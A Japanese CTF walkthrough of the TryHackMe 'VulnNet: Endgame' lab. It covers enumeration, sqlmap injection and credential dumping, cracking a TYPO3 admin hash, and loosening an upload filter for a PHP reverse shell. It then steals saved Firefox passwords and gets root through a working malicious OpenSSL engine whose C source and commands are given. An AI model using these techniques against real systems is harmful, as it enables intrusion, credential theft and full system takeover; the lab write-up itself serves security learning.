# VulnNet: Endgame CTF

https://tryhackme.com/room/vulnnetendgame

## Enumeration

```shell
TARGET=10.201.6.243
sudo bash -c "echo $TARGET   vulnnet.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```sh
sudo nmap -sS -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

### サブドメイン、VHOST

shop, blog, admin1, api サブドメインを発見。

```shell
ffuf -u http://vulnnet.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.vulnnet.thm' -fs 65

shop                    [Status: 200, Size: 26701, Words: 11619, Lines: 525]
blog                    [Status: 200, Size: 19316, Words: 1236, Lines: 391]
admin1                  [Status: 307, Size: 0, Words: 1, Lines: 1]
api                     [Status: 200, Size: 18, Words: 4, Lines: 1]
Shop                    [Status: 200, Size: 26701, Words: 11619, Lines: 525]
```

### ディレクトリ列挙

### vulnnet.thm

READMEは、`Soon - Responsive Free HTML5 Bootstrap Template`

/sass は、`Silence is Eloquence（沈黙は雄弁である）`と表示

```sh
root@ip-10-201-68-52:~# gobuster dir -q -x=txt,php -u http://vulnnet.thm -w ./dirlist.txt -t 64 -k

/css                  (Status: 301) [Size: 308] [--> http://vulnnet.thm/css/]
/fonts                (Status: 301) [Size: 310] [--> http://vulnnet.thm/fonts/]
/images               (Status: 301) [Size: 311] [--> http://vulnnet.thm/images/]
/js                   (Status: 301) [Size: 307] [--> http://vulnnet.thm/js/]
/README.txt           (Status: 200) [Size: 743]
/sass                 (Status: 301) [Size: 309] [--> http://vulnnet.thm/sass/]
```

### admin1

typo3 を発見。

```sh
dirb http://admin1.vulnnet.thm

---- Scanning URL: http://admin1.vulnnet.thm/ ----
==> DIRECTORY: http://admin1.vulnnet.thm/en/                                                                         
==> DIRECTORY: http://admin1.vulnnet.thm/fileadmin/                                                                  
+ http://admin1.vulnnet.thm/server-status (CODE:403|SIZE:283)                                                        
==> DIRECTORY: http://admin1.vulnnet.thm/typo3/                                                                      
==> DIRECTORY: http://admin1.vulnnet.thm/typo3conf/                                                                  
==> DIRECTORY: http://admin1.vulnnet.thm/typo3temp/                                                                  
==> DIRECTORY: http://admin1.vulnnet.thm/vendor/                                                                     
                                                                                                                     
---- Entering directory: http://admin1.vulnnet.thm/en/ ----
+ http://admin1.vulnnet.thm/en/index.html (CODE:200|SIZE:32)                                                         
                                                                                                                     
---- Entering directory: http://admin1.vulnnet.thm/fileadmin/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://admin1.vulnnet.thm/typo3/ ----
+ http://admin1.vulnnet.thm/typo3/index.php (CODE:200|SIZE:10843)                                                    
                                                                                                                     
---- Entering directory: http://admin1.vulnnet.thm/typo3conf/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://admin1.vulnnet.thm/typo3temp/ ----
==> DIRECTORY: http://admin1.vulnnet.thm/typo3temp/assets/                                                           
+ http://admin1.vulnnet.thm/typo3temp/index.html (CODE:200|SIZE:0)                                                   
==> DIRECTORY: http://admin1.vulnnet.thm/typo3temp/var/                                                              
                                                                                                                     
---- Entering directory: http://admin1.vulnnet.thm/vendor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://admin1.vulnnet.thm/typo3temp/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://admin1.vulnnet.thm/typo3temp/var/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
```

http://admin1.vulnnet.thm/typo3 で、TYPO3のログイン画面が出てきた。


### blog

```sh
[01:02:49] 200 -  506B  - /assets/
[01:03:00] 200 -   92B  - /index.php
[01:03:00] 200 -   92B  - /index.php/login/
[01:03:02] 200 -  647B  - /license.txt
[01:03:10] 200 -    5KB - /post.html
```

```sh
root@ip-10-201-68-52:~# gobuster dir -q -x=txt,php -u http://blog.vulnnet.thm -w ./dirlist.txt -t 64 -k

/assets               (Status: 301) [Size: 321] [--> http://blog.vulnnet.thm/assets/]
/index.php            (Status: 200) [Size: 96]
/license.txt          (Status: 200) [Size: 1068]
/post2.php            (Status: 200) [Size: 16272]
```

ブログポストのソースを見ると、apiサブドメインへのリクエストがある。

```js
getJSON('http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1',  function(err, data) {
```

### api

http://api.vulnnet.thm/vn_internals/api/v2/ にアクセスすると、種類はfetchしか無い。  
http://api.vulnnet.thm/vn_internals/api/v2/fetch　にアクセスすると下記が返る。

```json
{"request_id":null,"blog_id":null,"titles":400,"status":"Invalid Request"}
```

パラメータをファジングしたが、blog以外は何も出ない。

```sh
ffuf -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?FUZZ=1' -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 75

ffuf -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?FUZZ=1' -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -fs 75
```

fetch API に、SQLインジェクションの脆弱性を発見。

```sh
sqlmap -r ./fetch.txt --dbs --batch

available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin
```

be_usersテーブルをダンプ

```sh
Database: vn_admin
Table: be_users
[1 entry]
+-----+-----+-----------+--------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+---------------------+--------+------------+------------+---------+---------+---------+----------+---------------------------------------------------------------------------------------------------+----------+----------+----------+-----------+-----------+------------+-----------+-----------+--------------+---------------+---------------+----------------+----------------+-----------------+-----------------+------------------+------------------+-------------------+-----------------------+
| pid | uid | cruser_id | workspace_id | uc                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | lang    | email               | avatar | crdate     | tstamp     | admin   | deleted | endtime | TSconfig | password                                                                                          | realName | userMods | username | disable   | options   | lastlogin  | starttime | usergroup | lockToDomain | description   | disableIPlock | category_perms | db_mountpoints | createdByAction | workspace_perms | file_mountpoints | file_permissions | allowed_languages | usergroup_cached_list |
+-----+-----+-----------+--------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+---------------------+--------+------------+------------+---------+---------+---------+----------+---------------------------------------------------------------------------------------------------+----------+----------+----------+-----------+-----------+------------+-----------+-----------+--------------+---------------+---------------+----------------+----------------+-----------------+-----------------+------------------+------------------+-------------------+-----------------------+
| 0   | 1   | 0         | 0            | a:14:{s:14:\\"interfaceSetup\\";s:7:\\"backend\\";s:10:\\"moduleData\\";a:1:{s:32:\\"web_dashboard\\/current_dashboard\\/\\";s:40:\\"e5f1f8ea7b30afe7e4024c15b606a6fcb501a631\\";}s:19:\\"thumbnailsByDefault\\";i:1;s:14:\\"emailMeAtLogin\\";i:0;s:11:\\"startModule\\";s:13:\\"web_dashboard\\";s:8:\\"titleLen\\";i:50;s:8:\\"edit_RTE\\";s:1:\\"1\\";s:20:\\"edit_docModuleUpload\\";s:1:\\"1\\";s:15:\\"resizeTextareas\\";i:1;s:25:\\"resizeTextareas_MaxHeight\\";i:500;s:24:\\"resizeTextareas_Flexible\\";i:0;s:4:\\"lang\\";s:0:\\"\\";s:19:\\"firstLoginTimeStamp\\";i:1655226810;s:15:\\"moduleSessionID\\";a:1:{s:32:\\"web_dashboard\\/current_dashboard\\/\\";s:32:\\"773e00fbb960a0ba87ad8c39f3c4a691\\";}} | <blank> | chris_w@vulnnet.thm | 0      | 1655226789 | 1655226789 | 1       | 0       | 0       | NULL     | [REDACTED] | <blank>  | NULL     | chris_w  | 0         | 0         | 1655226810 | 0         | <blank>   | <blank>      | NULL          | 0             | NULL           | NULL           | 0               | 1               | NULL             | NULL             | <blank>           | NULL                  |
+-----+-----+-----------+--------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+---------------------+--------+------------+------------+---------+---------+---------+----------+---------------------------------------------------------------------------------------------------+----------+----------+----------+-----------+-----------+------------+-----------+-----------+--------------+---------------+---------------+----------------+----------------+-----------------+-----------------+------------------+------------------+-------------------+-----------------------+
```

このハッシュ用のhashcatモジュールがなかったので、デフォルトのワードリストでjohnを実行してみたが、時間がかかりすぎて諦めた。

1. blogデータベースのusersテーブルからパスワードリストを作成する（--where を使って200行ずつ出力）
2. そのパスワードリストを使って、johnでパスワードクラック。
3. クラックしたパスワードでTypo3にログインできた。

```sh
$ john --wordlist=/home/kali/ctf/vuln/blog_pw.txt ./hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (argon2 [Blake2 AVX])
Cost 1 (t) is 16 for all loaded hashes
Cost 2 (m) is 65536 for all loaded hashes
Cost 3 (p) is 2 for all loaded hashes
Cost 4 (type [0:Argon2d 1:Argon2i]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]      (?)     
1g 0:00:00:16 DONE (2025-11-11 12:09) 0.06250g/s 8.000p/s 8.000c/s 8.000C/s 8PwSht..0mpoPg
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## TYPO3

`You are using version 10.3.0`

PHPファイルをアップロードしようとしたが失敗。  
configuration は下記の内容になっていた。

```
fileDenyPattern = \.(php[3-8]?|phpsh|phtml|pht|phar|shtml|cgi)(\..*)?$|\.pl$|^\.htaccess$
```

拡張子をphpsに変更したらアップロードできたが、アクセスしたらForbiddenとなってトリガー失敗。   
phtm, pgif, hphp はソースが表示された。

管理ツールの `Configure Installation-Wide Options` から、上記の設定自体を変更できた。

phpファイルを許可してリバースシェル取得成功。

```sh
$ nc -lnvp 8888      
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.11.240] 42300
Linux vulnnet-endgame 5.4.0-120-generic #136~18.04.1-Ubuntu SMP Fri Jun 10 18:00:44 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 00:11:47 up 40 min,  0 users,  load average: 0.01, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 権限昇格１

systemユーザーに昇格が必要。.mozilla を参照可能。

```sh
www-data@vulnnet-endgame:/home/system$ ls -al
total 92
drwxr-xr-x 18 system system 4096 Jun 15  2022 .
drwxr-xr-x  3 root   root   4096 Jun 14  2022 ..
-rw-------  1 system system 2124 Jun 15  2022 .ICEauthority
lrwxrwxrwx  1 root   root      9 Jun 14  2022 .bash_history -> /dev/null
-rw-r--r--  1 system system  220 Jun 14  2022 .bash_logout
-rw-r--r--  1 system system 3771 Jun 14  2022 .bashrc
drwx------ 16 system system 4096 Jun 14  2022 .cache
drwx------ 14 system system 4096 Jun 14  2022 .config
drwx------  3 root   root   4096 Jun 14  2022 .dbus
drwx------  3 system system 4096 Jun 14  2022 .gnupg
drwx------  2 root   root   4096 Jun 14  2022 .gvfs
drwx------  3 system system 4096 Jun 14  2022 .local
drwxr-xr-x  4 system system 4096 Jun 14  2022 .mozilla
lrwxrwxrwx  1 root   root      9 Jun 14  2022 .mysql_history -> /dev/null
-rw-r--r--  1 system system  807 Jun 14  2022 .profile
-rw-r--r--  1 system system    0 Jun 14  2022 .sudo_as_admin_successful
drwxr-xr-x  2 system system 4096 Jun 14  2022 Desktop
drwxr-xr-x  2 system system 4096 Jun 14  2022 Documents
drwxr-xr-x  2 system system 4096 Jun 14  2022 Downloads
drwxr-xr-x  2 system system 4096 Jun 14  2022 Music
drwxr-xr-x  2 system system 4096 Jun 14  2022 Pictures
drwxr-xr-x  2 system system 4096 Jun 14  2022 Public
drwxr-xr-x  2 system system 4096 Jun 14  2022 Templates
dr-xr-x---  2 system system 4096 Jun 14  2022 Utils
drwxr-xr-x  2 system system 4096 Jun 14  2022 Videos
-rw-------  1 system system   38 Jun 14  2022 user.txt
```

.mozilla ディレクトリをZIP保存して転送。

```sh
www-data@vulnnet-endgame:/home/system$ zip -r /tmp/mozilla.zip ./.mozilla

www-data@vulnnet-endgame:/home/system$ ls -al /tmp
total 7900
drwxrwxrwt  2 root     root        4096 Nov 11 00:16 .
drwxr-xr-x 24 root     root        4096 Jun 15  2022 ..
-rw-rw-rw-  1 www-data www-data 8079868 Nov 11 00:16 mozilla.zip
```

Firefox でプロファイルを開き、保存されたパスワードを確認。

```sh
firefox --profile ./firefox/2fjnrwth.default-release --allow-downgrade
```

パスワードを使い、systemに昇格成功。SSH接続も可能。

```sh
www-data@vulnnet-endgame:/home/system$ su system
Password: 
system@vulnnet-endgame:~$ id
uid=1000(system) gid=1000(system) groups=1000(system)
```

## 権限昇格２

ローカルで631ポートが開いている。CUPS？

```sh
tcp   LISTEN  0       80                 127.0.0.1:3306           0.0.0.0:*                                                                                                                                                               
tcp   LISTEN  0       128            127.0.0.53%lo:53             0.0.0.0:*     
tcp   LISTEN  0       128                  0.0.0.0:22             0.0.0.0:*     
tcp   LISTEN  0       5                  127.0.0.1:631            0.0.0.0:*     
tcp   LISTEN  0       511                        *:80                   *:*     
tcp   LISTEN  0       128                     [::]:22                [::]:*     
tcp   LISTEN  0       5                      [::1]:631               [::]:*
```

version は 2.2。このバージョンの脆弱性は無い。
```sh
$ nmap -sV -p631 localhost           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 14:53 JST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000074s latency).
Other addresses for localhost (not scanned): ::1

PORT    STATE SERVICE VERSION
631/tcp open  ipp     CUPS 2.2
```

capを確認したところ、ホームディレクトリの openssl に、`=ep` という見慣れない表示が出ている。これは、すべてのケーパビリティが付いていることを意味する。

```sh
system@vulnnet-endgame:/var/www$ getcap -r / 2>/dev/null
/home/system/Utils/openssl =ep
/snap/core20/1081/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/openssl-privilege-escalation を参照。

kali上でコンパイル

```c
#include <openssl/engine.h>
#include <sys/types.h>
#include <unistd.h>

static int bind(ENGINE *e, const char *id) {
    setuid(0); setgid(0);
    system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

```sh
$ gcc -fPIC -o exploit.o -c exploit.c                                
$ gcc -shared -o exploit.so -lcrypto exploit.o
```

ターゲットにコピーしてエクスプロイト実行

```sh
system@vulnnet-endgame:~$ ./Utils/openssl req -engine ./exploit.so
root@vulnnet-endgame:~# id
uid=0(root) gid=0(root) groups=0(root),1000(system)
```

## 振り返り

- ユーザー＆パスワードのセットが2組あり、1つから目的ユーザーのパスワードハッシュ、もう1つからパスワードリストを作るというアプローチは斬新で盲点だった。
- api サブドメインに何かあるに違いないと考えたとき、パラメータファジングだけにこだわるのではなく、クライアントコードから呼び出されていないかに、考えが至らなかった。
- ケーパビリティの `=ep` を初めて見た。
